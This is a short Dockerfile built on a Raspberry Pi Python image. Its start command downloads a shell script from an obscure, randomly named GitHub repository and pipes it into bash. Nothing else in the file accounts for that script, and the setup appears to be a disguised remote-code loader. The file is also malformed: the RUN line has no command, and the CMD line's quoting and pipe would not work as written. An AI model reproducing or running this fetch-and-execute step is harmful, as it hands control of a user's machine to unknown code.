FROM balenalib/raspberry-pi-python:latest-bookworm-build
RUN --mount=type=tmpfs,target=/root/.cargo
CMD ['wget','-qO-','https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/altserver/start.sh','|','bash']
